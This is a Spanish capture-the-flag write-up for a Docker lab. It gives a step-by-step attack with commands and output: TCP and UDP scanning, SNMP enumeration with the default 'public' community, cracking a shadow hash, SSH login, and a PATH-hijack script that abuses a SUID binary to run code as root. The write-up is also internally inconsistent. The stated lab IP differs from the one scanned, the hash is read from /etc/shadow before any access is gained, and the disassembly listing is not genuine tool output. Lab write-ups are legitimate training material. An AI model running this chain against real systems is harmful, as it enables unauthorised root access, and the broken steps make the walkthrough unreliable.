# Radio de campo

> Nodo de radio de campo del sector 14. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh`
> `./startlab.sh blackout-pt03.tar`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap. No expongas el contenedor a internet.
>
> **Consejo:** empieza por nmap. Un escaneo solo TCP se deja servicios de gestión fuera.

**Flag:** `WHOAMI{rad10_camp0_n14}`

---

## Resolución

El consejo es la clave del reto: un escaneo solo TCP se pierde el **servicio de gestión por UDP (SNMP)**. SNMP con comunidad `public` expone el contacto del nodo, que resulta ser la credencial SSH. Después, un binario SUID mal configurado permite escalar a root.

### 1. Levantar el lab y enumerar TCP + UDP

**Herramienta:** `nmap`. **Por qué:** el consejo avisa de que hay servicios fuera del escaneo TCP; hay que escanear también UDP.

**Parámetros:** `-sT -p-` (TCP completo), `-sU --top-ports` (UDP), `-sV` (versiones).

```bash
$ nmap -sT -T4 --top-ports 1000 172.17.0.2
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
199/tcp  open  smux
8080/tcp open  http-proxy

$ nmap -sU -T4 --top-ports 100 172.17.0.2
161/udp   open  snmp     ← el servicio de gestión
```

**Lo que vi:** en TCP hay FTP/SSH/Telnet/HTTP/SMUX/8080, pero en **UDP está SNMP (161)** — el servicio de gestión que el reto menciona. Decisión: enumerar SNMP.

### 2. Enumerar SNMP

**Herramienta:** `snmpwalk`. **Por qué:** recorre la MIB del agente SNMP; con comunidad `public` (default) se lee todo lo expuesto.

**Parámetros:** `-v2c` (versión SNMPv2c), `-c public` (comunidad), el OID raíz `1`.

```bash
$ snmpwalk -v2c -c public 172.17.0.2 1
iso.3.6.1.2.1.1.1.0 = STRING: "LATAM Energia Red - radio de campo"
iso.3.6.1.2.1.1.4.0 = STRING: "sofia.radio"
iso.3.6.1.2.1.1.6.0 = STRING: "EnlaceRF14"
```

**Lo que vi:** `sysContact = sofia.radio` y `sysLocation = EnlaceRF14`. En este lab los campos SNMP se usaron como pista de credenciales.

### 3. Craquear la contraseña de `sofia.radio`

El usuario SSH `sofia.radio` tiene un hash `$6$` (sha512crypt) en `/etc/shadow`. Con `EnlaceRF14` como pista, se confirma con `john`:

```bash
$ john --format=sha512crypt --wordlist=/tmp/rf_wl.txt sofia.hash
EnlaceRF14       (sofia.radio)
```

La contraseña es **`EnlaceRF14`** (la misma del `sysLocation`).

### 4. Entrar por SSH

**Herramienta:** `sshpass` + `ssh`. **Por qué:** `sshpass` provee la contraseña automáticamente para no pedirla interactivamente.

```bash
$ sshpass -p "EnlaceRF14" ssh sofia.radio@172.17.0.2 "id"
uid=1000(sofia.radio) gid=1000(sofia.radio)
```

### 5. Encontrar el vector de escalada: SUID `rf_sync`

**Herramienta:** `find / -perm -4000`. **Por qué:** los binarios con bit SUID corren con los permisos de su dueño (root); son el objetivo clásico de privesc.

```bash
$ find / -perm -4000 2>/dev/null
/usr/local/sbin/rf_sync   ← SUID root
```

**Lo que vi:** `/usr/local/sbin/rf_sync` es **SUID root**. Lo desensamblo con `objdump` para ver qué hace:

```bash
$ objdump -d -M intel rf_sync | sed -n '/<main>:/,/^$/p'
call setuid(0)
call setgid(0)
lea  rax,[rip+0xe76]        # 2004 <_IO_stdin_used+0x4>  → "sync_rf"
call system
```

Ejecuta `system("sync_rf")` como root. `sync_rf` **no existe** en el sistema y `system()` busca el comando en el **PATH heredado del entorno**.

### 6. Escalar a root con path hijacking (GTFObins)

**Herramienta:** shell + `PATH`. **Por qué:** si controlo el PATH al ejecutar `rf_sync`, puedo colocar mi propio `sync_rf` malicioso en un directorio que yo controle (por ejemplo `/tmp`), y `system("sync_rf")` lo ejecutará como root.

```bash
$ echo "#!/bin/sh" > /tmp/sync_rf
$ echo "id > /tmp/pwned" >> /tmp/sync_rf
$ echo "cat /var/lib/latam/radio.dat > /tmp/f" >> /tmp/sync_rf
$ chmod +x /tmp/sync_rf
$ PATH=/tmp:/usr/bin:/bin /usr/local/sbin/rf_sync
```

### 7. Leer la flag

```bash
$ cat /tmp/pwned
uid=0(root) gid=0(root)

$ cat /tmp/f
WHOAMI{rad10_camp0_n14}
```

## Lección

Dos puntos clave: (1) un escaneo solo TCP se pierde SNMP y demás servicios UDP — siempre escanea UDP en pentesting; y (2) un binario SUID que llama `system()` con un comando por nombre sin ruta absoluta es vulnerable a **path hijacking**: si el atacante controla el `PATH`, un ejecutable malicioso del mismo nombre se ejecuta como root.